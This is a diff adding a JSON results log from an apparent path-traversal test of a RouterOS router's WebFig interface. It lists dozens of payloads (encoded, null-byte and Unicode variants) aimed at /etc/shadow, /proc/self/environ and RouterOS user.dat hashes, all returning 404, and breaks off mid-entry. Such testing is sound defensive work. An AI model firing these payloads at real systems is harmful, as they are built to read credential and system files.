@@ -1,0 +1,1947 @@
+{
+  "metadata": {
+    "script": "attack_www_traversal.py",
+    "target": "[REDACTED-INTERNAL-IP]",
+    "phase": "9-www-traversal",
+    "start_time": "2026-02-16T14:08:26.074030",
+    "end_time": "2026-02-16T14:08:26.657738",
+    "total_tests": 100,
+    "anomalies": 0,
+    "router_version": "7.20.8 (long-term)",
+    "initial_uptime": "2h9m4s",
+    "router_log_count": 1000,
+    "router_interesting_events": 0,
+    "final_health": {
+      "alive": true,
+      "uptime": "2h9m15s",
+      "cpu_load": "0",
+      "free_memory": "839405568",
+      "version": "7.20.8 (long-term)"
+    }
+  },
+  "tests": [
+    {
+      "id": 1,
+      "category": "baseline",
+      "name": "Response baseline",
+      "description": "Establish baseline response patterns for comparison",
+      "result": "WebFig=200, 404=404, REST=200, Root=200",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.118008",
+      "details": {
+        "baseline": {
+          "webfig_normal": {
+            "status": 200,
+            "body_len": 22450,
+            "content_type": "text/html"
+          },
+          "webfig_404": {
+            "status": 404,
+            "body_len": 99,
+            "content_type": "text/html",
+            "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n"
+          },
+          "rest_normal": {
+            "status": 200,
+            "body_len": 440,
+            "content_type": "application/json"
+          },
+          "root": {
+            "status": 200,
+            "body_len": 1280,
+            "content_type": "text/html"
+          }
+        }
+      }
+    },
+    {
+      "id": 2,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../etc/passwd",
+      "description": "Basic ../../etc/passwd",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.122006",
+      "details": {
+        "path": "/webfig/../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 3,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../../etc/passwd",
+      "description": "Triple ../../../etc/passwd",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.126004",
+      "details": {
+        "path": "/webfig/../../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 4,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../../../etc/passwd",
+      "description": "Quad ../../../../etc/passwd",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.130002",
+      "details": {
+        "path": "/webfig/../../../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 5,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../../etc/shadow",
+      "description": "Shadow file traversal",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.134000",
+      "details": {
+        "path": "/webfig/../../../etc/shadow",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 6,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../nova/etc/init",
+      "description": "RouterOS nova init config",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.134000",
+      "details": {
+        "path": "/webfig/../../nova/etc/init",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 7,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../rw/logs",
+      "description": "RouterOS rw/logs directory",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.137998",
+      "details": {
+        "path": "/webfig/../../rw/logs",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 8,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../flash/rw/store/user.dat",
+      "description": "RouterOS user.dat (password hashes)",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.141996",
+      "details": {
+        "path": "/webfig/../../flash/rw/store/user.dat",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 9,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/....//....//etc/passwd",
+      "description": "Doubled-dot with extra slash",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.145994",
+      "details": {
+        "path": "/webfig/....//....//etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 10,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/..../....//etc/passwd",
+      "description": "Four-dot variant",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.149992",
+      "details": {
+        "path": "/webfig/..../....//etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 11,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/./../.././etc/passwd",
+      "description": "Dot-slash-dot-dot-slash mix",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.153990",
+      "details": {
+        "path": "/webfig/./../.././etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 12,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/./../.././etc/passwd",
+      "description": "Interleaved dot-slash",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.153990",
+      "details": {
+        "path": "/webfig/./../.././etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 13,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../../../../proc/version",
+      "description": "/proc/version via deep traversal",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.161986",
+      "details": {
+        "path": "/webfig/../../../../../proc/version",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 14,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../../../../proc/self/cmdline",
+      "description": "/proc/self/cmdline deep",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.161986",
+      "details": {
+        "path": "/webfig/../../../../../proc/self/cmdline",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 15,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../../../../proc/self/environ",
+      "description": "/proc/self/environ deep",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.165984",
+      "details": {
+        "path": "/webfig/../../../../../proc/self/environ",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 16,
+      "category": "webfig_traversal",
+      "name": "Traversal: /webfig/../../etc/passwd/",
+      "description": "Trailing slash on target",
+      "result": "HTTP 404, body_len=99",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.169982",
+      "details": {
+        "path": "/webfig/../../etc/passwd/",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 17,
+      "category": "url_encoding",
+      "name": "Encoding: Single-encoded ../ (%2e%2e%2f)",
+      "description": "Single-encoded ../ (%2e%2e%2f)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.181976",
+      "details": {
+        "path": "/webfig/%2e%2e/%2e%2e/etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 18,
+      "category": "url_encoding",
+      "name": "Encoding: Full single-encode dots+slash",
+      "description": "Full single-encode dots+slash",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.185974",
+      "details": {
+        "path": "/webfig/%2e%2e%2f%2e%2e%2f/etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 19,
+      "category": "url_encoding",
+      "name": "Encoding: Encoded slash only (..%2f)",
+      "description": "Encoded slash only (..%2f)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.189972",
+      "details": {
+        "path": "/webfig/..%2f..%2f..%2fetc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 20,
+      "category": "url_encoding",
+      "name": "Encoding: Single level encoded",
+      "description": "Single level encoded",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.193970",
+      "details": {
+        "path": "/webfig/%2e%2e/etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 21,
+      "category": "url_encoding",
+      "name": "Encoding: Double-encoded (%252e%252e)",
+      "description": "Double-encoded (%252e%252e)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.197968",
+      "details": {
+        "path": "/webfig/%252e%252e/%252e%252e/etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 22,
+      "category": "url_encoding",
+      "name": "Encoding: Double-encoded slash (%252f)",
+      "description": "Double-encoded slash (%252f)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.201966",
+      "details": {
+        "path": "/webfig/..%252f..%252f/etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 23,
+      "category": "url_encoding",
+      "name": "Encoding: Full double-encode",
+      "description": "Full double-encode",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.205964",
+      "details": {
+        "path": "/webfig/%252e%252e%252f%252e%252e%252f/etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 24,
+      "category": "url_encoding",
+      "name": "Encoding: Mixed: encoded first, raw second",
+      "description": "Mixed: encoded first, raw second",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.205964",
+      "details": {
+        "path": "/webfig/%2e%2e/../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 25,
+      "category": "url_encoding",
+      "name": "Encoding: Mixed: raw first, encoded second",
+      "description": "Mixed: raw first, encoded second",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.209962",
+      "details": {
+        "path": "/webfig/../%2e%2e/etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 26,
+      "category": "url_encoding",
+      "name": "Encoding: Partial: ..%2f (one level)",
+      "description": "Partial: ..%2f (one level)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.213960",
+      "details": {
+        "path": "/webfig/..%2fetc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 27,
+      "category": "url_encoding",
+      "name": "Encoding: Encoded backslash (%5c)",
+      "description": "Encoded backslash (%5c)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.217958",
+      "details": {
+        "path": "/webfig/%2e%2e%5c%2e%2e%5cetc%5cpasswd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 28,
+      "category": "url_encoding",
+      "name": "Encoding: Uppercase hex encoding (%2E)",
+      "description": "Uppercase hex encoding (%2E)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.221956",
+      "details": {
+        "path": "/webfig/%2E%2E/%2E%2E/etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 29,
+      "category": "null_byte",
+      "name": "Null: Null before .html extension",
+      "description": "Null before .html extension",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.229952",
+      "details": {
+        "path": "/webfig/../../etc/passwd%00.html",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 30,
+      "category": "null_byte",
+      "name": "Null: Null before .css extension",
+      "description": "Null before .css extension",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.229952",
+      "details": {
+        "path": "/webfig/../../etc/passwd%00.css",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 31,
+      "category": "null_byte",
+      "name": "Null: Null before .js extension",
+      "description": "Null before .js extension",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.233950",
+      "details": {
+        "path": "/webfig/../../etc/passwd%00.js",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 32,
+      "category": "null_byte",
+      "name": "Null: Null before .png extension",
+      "description": "Null before .png extension",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.241946",
+      "details": {
+        "path": "/webfig/../../etc/passwd%00.png",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 33,
+      "category": "null_byte",
+      "name": "Null: Raw null byte before .html",
+      "description": "Raw null byte before .html",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.249942",
+      "details": {
+        "path": "/webfig/../../etc/passwd\u0000.html",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 34,
+      "category": "null_byte",
+      "name": "Null: Raw null at end of path",
+      "description": "Raw null at end of path",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.249942",
+      "details": {
+        "path": "/webfig/../../etc/passwd\u0000",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 35,
+      "category": "null_byte",
+      "name": "Null: Null inside traversal sequence",
+      "description": "Null inside traversal sequence",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.257938",
+      "details": {
+        "path": "/webfig/..\u0000./etc/passwd",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 36,
+      "category": "null_byte",
+      "name": "Null: Null before traversal",
+      "description": "Null before traversal",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.261936",
+      "details": {
+        "path": "/webfig/%00../../etc/passwd",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 37,
+      "category": "null_byte",
+      "name": "Null: Double-encoded null (%2500)",
+      "description": "Double-encoded null (%2500)",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.261936",
+      "details": {
+        "path": "/webfig/../../etc/passwd%2500.html",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 38,
+      "category": "null_byte",
+      "name": "Null: Null in middle of filename",
+      "description": "Null in middle of filename",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.265934",
+      "details": {
+        "path": "/webfig/../../etc/pas%00swd",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 39,
+      "category": "unicode_norm",
+      "name": "Unicode: Overlong 2-byte dot-dot (%c0%ae%c0%ae/)",
+      "description": "Overlong 2-byte dot-dot (%c0%ae%c0%ae/)",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.277928",
+      "details": {
+        "path": "/webfig/\ufffd\ufffd\ufffd\ufffd/\ufffd\ufffd\ufffd\ufffd/etc/passwd",
+        "path_hex": "2f7765626669672fc0aec0ae2fc0aec0ae2f6574632f706173737764",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 40,
+      "category": "unicode_norm",
+      "name": "Unicode: URL-encoded overlong dot (%c0%ae)",
+      "description": "URL-encoded overlong dot (%c0%ae)",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.277928",
+      "details": {
+        "path": "/webfig/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+        "path_hex": "2f7765626669672f2563302561652563302561652f2563302561652563302561652f6574632f706173737764",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 41,
+      "category": "unicode_norm",
+      "name": "Unicode: 3-byte overlong dot (%e0%80%ae)",
+      "description": "3-byte overlong dot (%e0%80%ae)",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.281926",
+      "details": {
+        "path": "/webfig/%e0%80%ae%e0%80%ae/%e0%80%ae%e0%80%ae/etc/passwd",
+        "path_hex": "2f7765626669672f2565302538302561652565302538302561652f2565302538302561652565302538302561652f6574632f706173737764",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 42,
+      "category": "unicode_norm",
+      "name": "Unicode: Overlong slash (%c0%af)",
+      "description": "Overlong slash (%c0%af)",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.285924",
+      "details": {
+        "path": "/webfig/..%c0%af..%c0%afetc%c0%afpasswd",
+        "path_hex": "2f7765626669672f2e2e2563302561662e2e256330256166657463256330256166706173737764",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 43,
+      "category": "unicode_norm",
+      "name": "Unicode: Overlong dots with normal slashes",
+      "description": "Overlong dots with normal slashes",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.289922",
+      "details": {
+        "path": "/webfig/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+        "path_hex": "2f7765626669672f2563302561652563302561652f2563302561652563302561652f6574632f706173737764",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 44,
+      "category": "unicode_norm",
+      "name": "Unicode: Fullwidth period (U+FF0E) dot-dot",
+      "description": "Fullwidth period (U+FF0E) dot-dot",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.293920",
+      "details": {
+        "path": "/webfig/\uff0e\uff0e/\uff0e\uff0e/etc/passwd",
+        "path_hex": "2f7765626669672fefbc8eefbc8e2fefbc8eefbc8e2f6574632f706173737764",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 45,
+      "category": "unicode_norm",
+      "name": "Unicode: Fullwidth solidus (U+FF0F) as slash",
+      "description": "Fullwidth solidus (U+FF0F) as slash",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.297918",
+      "details": {
+        "path": "/webfig/..\uff0f..\uff0fetc\uff0fpasswd",
+        "path_hex": "2f7765626669672f2e2eefbc8f2e2eefbc8f657463efbc8f706173737764",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 46,
+      "category": "unicode_norm",
+      "name": "Unicode: URL-encoded fullwidth period",
+      "description": "URL-encoded fullwidth period",
+      "result": "Status: HTTP/1.1 404 Not Found, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.301916",
+      "details": {
